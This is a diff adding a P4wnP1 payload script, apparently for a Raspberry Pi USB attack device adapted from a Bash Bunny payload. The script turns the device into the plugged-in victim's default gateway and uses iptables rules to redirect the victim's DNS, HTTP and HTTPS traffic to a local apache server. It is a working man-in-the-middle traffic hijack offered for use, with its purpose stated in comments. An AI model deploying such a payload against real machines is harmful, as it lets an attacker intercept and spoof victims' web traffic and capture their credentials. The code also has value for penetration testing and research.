@@ -1,0 +1,40 @@
+#    This file is part of P4wnP1.
+#
+#    Copyright (c) 2017, Marcus Mengs. 
+#
+#    P4wnP1 is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    P4wnP1 is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.
+
+
+#Author: Briskat
+#Based on Bash bunny payload by Sebastian Kinne 'Sebkinne'
+#=================================
+USE_RNDIS=true   # Enables USB Ethernet Gadget
+USE_HID=true     # If you ever want to use ducky scripts with this payload
+ROUTE_SPOOF=true # Makes IP of P4wnP1 the default gateway on the victim
+#==================================
+
+function setupNetworking() {
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    iptables -A INPUT -i usb0 -p udp --dport 53 -j ACCEPT
+    iptables -A INPUT -i usb0 -p udp --dport 443 -j DROP
+    iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j DNAT --to-destination 172.16.0.2:80
+    iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j DNAT --to-destination 172.16.0.1:80
+    iptables -t nat -A PREROUTING -i usb0 -p udp --dport 53 -j DNAT --to-destination 172.16.0.1:53
+    iptables -t nat -A POSTROUTING -j MASQUERADE
+}
+
+service apache2 start # Start apache (must be installed, check out readme for more info)
+setupNetworking       # Calls function written above to redirect all network traffic (needs more work)
+led_blink 3           # blinks led on pi 3 times in a loop
+
